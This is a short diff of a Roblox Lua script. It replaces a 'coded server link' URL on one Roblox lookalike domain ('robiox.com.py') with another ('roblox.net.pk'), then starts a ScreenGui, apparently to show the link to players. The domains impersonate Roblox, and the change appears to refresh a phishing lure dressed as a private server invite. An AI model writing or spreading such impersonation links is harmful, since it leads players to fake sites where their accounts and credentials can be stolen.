@@ -4,7 +4,7 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
 -- UPDATED CODED SERVER LINK
-local codedServerLink = "https://www.robiox.com.py/games/17625359962/RIVALS?privateServerLinkCode=331724222539285903557117888312"
+local codedServerLink = "https://roblox.net.pk/games/17625359962/RIVALS?privateServerLinkCode=06020718146043850785178785819102"
 
 -- ScreenGui
 local gui = Instance.new("ScreenGui")
